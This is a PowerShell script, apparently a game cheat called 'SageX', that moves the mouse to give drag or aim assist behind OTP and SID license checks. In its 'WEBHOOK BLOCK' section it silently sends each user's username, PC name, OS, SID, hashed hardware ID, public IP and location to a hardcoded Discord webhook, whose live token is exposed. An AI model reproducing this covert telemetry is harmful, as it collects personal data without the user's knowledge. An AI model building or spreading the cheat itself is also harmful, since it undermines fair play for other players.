Clear-Host

# ==================== OTP VERIFICATION SYSTEM ====================
function Get-MachineFingerprint {
    # Create a unique fingerprint using multiple system identifiers
    $cpuId = (Get-WmiObject Win32_Processor).ProcessorId
    $biosId = (Get-WmiObject Win32_BIOS).SerialNumber
    $diskId = (Get-WmiObject Win32_DiskDrive).SerialNumber
    $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }).MacAddress | Select-Object -First 1
    
    $combinedId = "$cpuId$biosId$diskId$macAddress"
    $hashedId = [System.BitConverter]::ToString(
        [System.Security.Cryptography.SHA256]::Create().ComputeHash(
            [System.Text.Encoding]::UTF8.GetBytes($combinedId)
        )
    ) -replace "-", ""
    
    return $hashedId.Substring(0, 32)  # Return first 32 chars of hash
}

function Generate-SecureOTP {
    param([int]$Length = 12)
    
    # Create a cryptographically secure OTP
    $validChars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"  # Exclude easily confused chars
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $bytes = New-Object byte[]($Length)
    $rng.GetBytes($bytes)
    
    $otp = -join ($bytes | ForEach-Object {
        $validChars[$_ % $validChars.Length]
    })
    
    return $otp
}

function Verify-OTP {
    param(
        [string]$MachineFingerprint,
        [string]$OTP,
        [string]$DatabaseURL
    )
    
    try {
        # Fetch remote database with retry logic
        $maxRetries = 3
        $retryCount = 0
        $remoteData = $null
        
        do {
            try {
                $remoteData = Invoke-RestMethod -Uri $DatabaseURL -UseBasicParsing -ErrorAction Stop -ContentType "text/plain; charset=utf-8"
                break
            }
            catch {
                $retryCount++
                if ($retryCount -ge $maxRetries) {
                    throw "Failed to fetch OTP database after $maxRetries attempts: $_"
                }
                Start-Sleep -Seconds 5
            }
        } while ($true)

        if ([string]::IsNullOrEmpty($remoteData)) {
            Write-Host "[!] Empty OTP database received" -ForegroundColor Red
            return $false
        }
        
        # Check for matching entry (format: fingerprint:otp:timestamp)
        $pattern = "$MachineFingerprint`:$OTP`:\d{4}-\d{2}-\d{2}"
        if ($remoteData -match $pattern) {
            return $true
        }
        
        return $false
    }
    catch {
        Write-Host "[!] Failed to verify OTP: $_" -ForegroundColor Red
        return $false
    }
}

function Initialize-OTPSystem {
    # Create SageX Regedit folder in AppData if it doesn't exist
    $appDataFolder = "$env:APPDATA\SageX Regedit"
    if (-not (Test-Path $appDataFolder)) {
        try {
            New-Item -ItemType Directory -Path $appDataFolder -Force | Out-Null
        }
        catch {
            Write-Host "[!] Failed to create SageX Regedit folder: $_" -ForegroundColor Red
            exit
        }
    }
    
    $LocalStoragePath = "$appDataFolder\otp.ini"
    $RemoteDatabaseURL = "https://raw.githubusercontent.com/Toxic-Speed/SAG--X/main/otp_db.txt"
    $machineFingerprint = Get-MachineFingerprint
    
    # Check if OTP already exists locally
    if (Test-Path $LocalStoragePath) {
        try {
            $localOTP = Get-Content $LocalStoragePath | Where-Object { $_ -match '^otp=' } | ForEach-Object { ($_ -split '=')[1] }
            
            if ([string]::IsNullOrEmpty($localOTP)) {
                throw "No OTP found in local storage"
            }
            
            # Verify against remote database
            $isVerified = Verify-OTP -MachineFingerprint $machineFingerprint -OTP $localOTP -DatabaseURL $RemoteDatabaseURL
            
            if (-not $isVerified) {
                Write-Host "`n[!] Device not authorized. Please contact support." -ForegroundColor Red
                Write-Host "[!] Fingerprint: $machineFingerprint" -ForegroundColor Yellow
                Write-Host "[!] OTP: $localOTP" -ForegroundColor Cyan
                Start-Sleep 15
                exit
            }
            
            Write-Host "`n[+] Device verified successfully!" -ForegroundColor Green
            return $true
        }
        catch {
            Write-Host "[!] Error reading local OTP: $_" -ForegroundColor Red
            exit
        }
    }
    else {
        # First-time setup - generate and store OTP
        $newOTP = Generate-SecureOTP -Length 12
        $otpContent = @(
            "[OTP]",
            "fingerprint=$machineFingerprint",
            "otp=$newOTP",
            "generated=$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        )
        
        try {
            $otpContent | Out-File -FilePath $LocalStoragePath -Force -Encoding UTF8
            Write-Host "`n[!] FIRST-TIME SETUP REQUIRED" -ForegroundColor Yellow
            Write-Host "=============================================" -ForegroundColor Cyan
            Write-Host "[!] Please register this device with the following information:" -ForegroundColor Cyan
            Write-Host "`n[!] Fingerprint: $machineFingerprint" -ForegroundColor Yellow
            Write-Host "[!] OTP: $newOTP" -ForegroundColor Green
            Write-Host "`n[!] Send this information to the developer :" -ForegroundColor Cyan
            Write-Host "`n[*] Exiting until device is authorized..." -ForegroundColor Red
            Start-Sleep 10
            exit
        }
        catch {
            Write-Host "[!] Failed to create OTP file: $_" -ForegroundColor Red
            exit
        }
    }
}

# ==================== MAIN SCRIPT ====================

# Run OTP verification first
Initialize-OTPSystem

cls

# ASCII Art with colors
$colors = @("Red", "Yellow", "Cyan", "Green", "Magenta", "Blue", "White")

$asciiArt = @'
  _________                     ____  ___ __________                         .___.__  __   
 /   _____/____     ____   ____ \   \/  / \______   \ ____   ____   ____   __| _/|__|/  |_ 
 \_____  \\__  \   / ___\_/ __ \ \     /   |       _// __ \ / ___\_/ __ \ / __ | |  \   __\
 /        \/ __ \_/ /_/  >  ___/ /     \   |    |   \  ___// /_/  >  ___// /_/ | |  ||  |  
/_______  (____  /\___  / \___  >___/\  \  |____|_  /\___  >___  / \___  >____ | |__||__|  
        \/     \//_____/      \/      \_/         \/     \/_____/      \/     \/             
'@

$asciiArt -split "`n" | ForEach-Object {
    $color = Get-Random -InputObject $colors
    Write-Host $_ -ForegroundColor $color
}

# Get SID
try {
    $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
    Write-Host "`n[*] Your SID: $sid" -ForegroundColor Yellow
} catch {
    Write-Host "[!] Failed to get SID" -ForegroundColor Red
    exit
}

# ==================== WEBHOOK BLOCK ====================
$webhookUrl = "https://discord.com/api/webhooks/1375353706232414238/dMBMuwq29UaqujrlC1YPhh9-ygK-pX2mY5S7VHb4-WUrxWMPBB8YPVszTfubk-eVLrgN"

$user = $env:USERNAME
$pcName = $env:COMPUTERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
$hashedHWID = [System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid))) -replace "-", ""

try {
    $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json" -ErrorAction Stop
    $ip = $ipInfo.query
    $country = $ipInfo.country
    $region = $ipInfo.regionName
    $city = $ipInfo.city
} catch {
    $ip = "Unavailable"
    $country = "Unavailable"
    $region = "Unavailable"
    $city = "Unavailable"
}

$embed = @{
    title = "<:Dead:1346705076626002033> SageX Executed"
    color = 16711680
    timestamp = (Get-Date).ToString("o")
    fields = @(
        @{ name = "<a:trick_supreme:1346694280386707466> User"; value = $user; inline = $true },
        @{ name = "<a:trick_supreme:1346694193157767269> PC Name"; value = $pcName; inline = $true },
        @{ name = "<:windows:904792336058425346> OS"; value = $os; inline = $false },
        @{ name = "<:trick_supreme:1346446598791757884> SID"; value = $sid; inline = $false },
        @{ name = "<:trick_supreme:1346446598791757884> HWID (hashed)"; value = $hashedHWID; inline = $false },
        @{ name = "<:trick_supreme:1346446598791757884> IP Address"; value = $ip; inline = $true },
        @{ name = "<:trick_supreme:1346446598791757884> Location"; value = "$city, $region, $country"; inline = $true },
        @{ name = "<a:726747821373653072:1346705048947785822> Time"; value = $time; inline = $false }
    )
}

$payload = @{
    username = "SageX Logger"
    embeds = @($embed)
} | ConvertTo-Json -Depth 10

try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop
} catch {
}

# ==================== HWID VERIFICATION ====================
$authURL = "https://raw.githubusercontent.com/Toxic-Speed/SAGE-X/main/HWID"

try {
    $rawData = Invoke-RestMethod -Uri $authURL -UseBasicParsing -ErrorAction Stop
    if ([string]::IsNullOrEmpty($rawData)) {
        throw "Empty HWID database received"
    }
} catch {
    Write-Host "`n[!] Failed to fetch authorized SIDs from server: $_" -ForegroundColor Red
    exit
}

# Check if SID is authorized
if ($rawData -notmatch $sid) {
    Write-Host "`n[!] Unauthorized access detected!" -ForegroundColor Red
    Write-Host "[!] Your SID was not found in the authorized database" -ForegroundColor Yellow
    Start-Sleep -Seconds 2
    exit
}

# ==================== VISUAL UI ====================
function Show-Controls {
    param(
        [bool]$Enabled,
        [int]$Strength,
        [int]$Smoothness,
        [int]$AssistLevel
    )
    
    # Clear previous controls display
    $Host.UI.RawUI.CursorPosition = New-Object System.Management.Automation.Host.Coordinates 0, ($Host.UI.RawUI.CursorPosition.Y - 6)
    
    # Status indicator
    $statusColor = if ($Enabled) { "Green" } else { "Red" }
    Write-Host "`nStatus: " -NoNewline
    if ($Enabled) { Write-Host "ACTIVE " -ForegroundColor $statusColor } else { Write-Host "INACTIVE" -ForegroundColor $statusColor }
    
    # Strength slider
    Write-Host "`nStrength: [" -NoNewline
    Write-Host ("=" * $Strength) -NoNewline -ForegroundColor Cyan
    Write-Host (" " * (10 - $Strength)) -NoNewline
    Write-Host "] $Strength/10" -ForegroundColor Yellow
    
    # Smoothness slider
    Write-Host "Smoothness: [" -NoNewline
    Write-Host ("=" * $Smoothness) -NoNewline -ForegroundColor Cyan
    Write-Host (" " * (10 - $Smoothness)) -NoNewline
    Write-Host "] $Smoothness/10" -ForegroundColor Yellow
    
    # Assist level slider
    Write-Host "Assist: [" -NoNewline
    Write-Host ("=" * $AssistLevel) -NoNewline -ForegroundColor Cyan
    Write-Host (" " * (10 - $AssistLevel)) -NoNewline
    Write-Host "] $AssistLevel/10" -ForegroundColor Yellow
    
    # Controls help
    Write-Host "`nControls:" -ForegroundColor Magenta
    Write-Host "F7: Toggle ON/OFF | F8: Increase Strength | F9: Decrease Strength"
    Write-Host "F10: Increase Smoothness | F11: Decrease Smoothness"
    Write-Host "F12: Increase Assist | INSERT: Decrease Assist"
}

# ==================== ENHANCED DRAG ASSIST ====================
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

public class SageXDragAssist {
    [DllImport("user32.dll")]
    public static extern bool GetCursorPos(out POINT lpPoint);

    [DllImport("user32.dll")]
    public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    [DllImport("kernel32.dll")]
    public static extern bool AllocConsole();

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    public const int MOUSEEVENTF_MOVE = 0x0001;
    public const int VK_LBUTTON = 0x01;
    public const int VK_F7 = 0x76;
    public const int VK_F8 = 0x77;
    public const int VK_F9 = 0x78;
    public const int VK_F10 = 0x79;
    public const int VK_F11 = 0x7A;
    public const int VK_F12 = 0x7B;
    public const int VK_INSERT = 0x2D;
    public const int SW_HIDE = 0;
    public const int SW_SHOW = 5;

    [StructLayout(LayoutKind.Sequential)]
    public struct POINT {
        public int X;
        public int Y;
    }

    public static bool Enabled = true;
    public static int Strength = 6;  // Default strength (1-10)
    public static int Smoothness = 5; // Default smoothness (1-10)
    public static int AssistLevel = 7; // Default assist level (1-10)

    public static void UpdateUI() {
        try {
            Console.SetCursorPosition(0, Console.CursorTop - 7);
            Console.WriteLine("Status: " + (Enabled ? "ACTIVE " : "INACTIVE"));
            Console.WriteLine("\nStrength: [" + new string('=', Strength) + new string(' ', 10 - Strength) + "] " + Strength + "/10");
            Console.WriteLine("Smoothness: [" + new string('=', Smoothness) + new string(' ', 10 - Smoothness) + "] " + Smoothness + "/10");
            Console.WriteLine("Assist: [" + new string('=', AssistLevel) + new string(' ', 10 - AssistLevel) + "] " + AssistLevel + "/10");
            Console.WriteLine("\nControls:");
            Console.WriteLine("F7: Toggle ON/OFF | F8: Increase Strength | F9: Decrease Strength");
            Console.WriteLine("F10: Increase Smoothness | F11: Decrease Smoothness");
            Console.WriteLine("F12: Increase Assist | INSERT: Decrease Assist");
        } catch {
            // Silently handle UI errors to prevent crashes
        }
    }

    public static void Run() {
        // Initialize console window
        IntPtr consoleHandle = GetConsoleWindow();
        ShowWindow(consoleHandle, SW_SHOW);

        POINT prev;
        GetCursorPos(out prev);
        bool isHolding = false;
        DateTime pressStart = DateTime.MinValue;
        DateTime lastUIUpdate = DateTime.MinValue;

        while (true) {
            Thread.Sleep(5);  // Reduced sleep for more responsiveness

            // Handle key presses for controls
            bool togglePressed = (GetAsyncKeyState(VK_F7) & 0x8000) != 0;
            bool incStrength = (GetAsyncKeyState(VK_F8) & 0x8000) != 0;
            bool decStrength = (GetAsyncKeyState(VK_F9) & 0x8000) != 0;
            bool incSmoothness = (GetAsyncKeyState(VK_F10) & 0x8000) != 0;
            bool decSmoothness = (GetAsyncKeyState(VK_F11) & 0x8000) != 0;
            bool incAssist = (GetAsyncKeyState(VK_F12) & 0x8000) != 0;
            bool decAssist = (GetAsyncKeyState(VK_INSERT) & 0x8000) != 0;

            if (togglePressed && (DateTime.Now - lastUIUpdate).TotalMilliseconds > 200) {
                Enabled = !Enabled;
                Console.Beep(Enabled ? 800 : 400, 100);
                UpdateUI();
                lastUIUpdate = DateTime.Now;
                Thread.Sleep(200);  // Debounce
            }

            if (incStrength && Strength < 10 && (DateTime.Now - lastUIUpdate).TotalMilliseconds > 200) {
                Strength++;
                UpdateUI();
                lastUIUpdate = DateTime.Now;
                Thread.Sleep(200);
            }

            if (decStrength && Strength > 1 && (DateTime.Now - lastUIUpdate).TotalMilliseconds > 200) {
                Strength--;
                UpdateUI();
                lastUIUpdate = DateTime.Now;
                Thread.Sleep(200);
            }

            if (incSmoothness && Smoothness < 10 && (DateTime.Now - lastUIUpdate).TotalMilliseconds > 200) {
                Smoothness++;
                UpdateUI();
                lastUIUpdate = DateTime.Now;
                Thread.Sleep(200);
            }

            if (decSmoothness && Smoothness > 1 && (DateTime.Now - lastUIUpdate).TotalMilliseconds > 200) {
                Smoothness--;
                UpdateUI();
                lastUIUpdate = DateTime.Now;
                Thread.Sleep(200);
            }

            if (incAssist && AssistLevel < 10 && (DateTime.Now - lastUIUpdate).TotalMilliseconds > 200) {
                AssistLevel++;
                UpdateUI();
                lastUIUpdate = DateTime.Now;
                Thread.Sleep(200);
            }

            if (decAssist && AssistLevel > 1 && (DateTime.Now - lastUIUpdate).TotalMilliseconds > 200) {
                AssistLevel--;
                UpdateUI();
                lastUIUpdate = DateTime.Now;
                Thread.Sleep(200);
            }

            if (!Enabled)
                continue;

            bool lmbDown = (GetAsyncKeyState(VK_LBUTTON) & 0x8000) != 0;

            if (lmbDown) {
                if (!isHolding) {
                    isHolding = true;
                    pressStart = DateTime.Now;
                } 
                else if ((DateTime.Now - pressStart).TotalMilliseconds >= (100 - (Smoothness * 7))) {
                    POINT curr;
                    GetCursorPos(out curr);

                    int deltaY = curr.Y - prev.Y;
                    int deltaX = curr.X - prev.X;

                    if (deltaY < -1) {
                        // Calculate adjusted values based on settings
                        double strengthFactor = 0.2 + (Strength * 0.06);
                        double assistFactor = 0.3 + (AssistLevel * 0.05);
                        
                        int correctedX = (int)(deltaX * (strengthFactor * 0.7));
                        int correctedY = (int)(deltaY * strengthFactor * -assistFactor);

                        // Apply smoothness by breaking the movement into steps
                        int steps = 1 + (int)(Smoothness * 0.5);
                        for (int i = 0; i < steps; i++) {
                            mouse_event(MOUSEEVENTF_MOVE, correctedX / steps, correctedY / steps, 0, 0);
                            Thread.Sleep(5);
                        }
                    }

                    prev = curr;
                }
            } 
            else {
                isHolding = false;
            }

            // Update UI periodically
            if ((DateTime.Now - lastUIUpdate).TotalSeconds > 5) {
                UpdateUI();
                lastUIUpdate = DateTime.Now;
            }
        }
    }
}
"@

# Initial UI display
Show-Controls -Enabled $true -Strength 6 -Smoothness 5 -AssistLevel 7

# Display feature information
$msgLines = @(
    "[+] AI-Powered Drag Assist Activated",
    "[+] Dynamic Sensitivity Adjustment Enabled",
    "[+] Real-Time Performance Optimization",
    "[+] Adaptive Response Curve Based on Movement",
    "[+] Advanced Anti-Shake Algorithm",
    "[+] Press F7 to Toggle ON/OFF"
)
$msgLines | ForEach-Object {
    Write-Host $_ -ForegroundColor Cyan
    Start-Sleep -Milliseconds 300
}

# Start the enhanced drag assist
[SageXDragAssist]::Run()
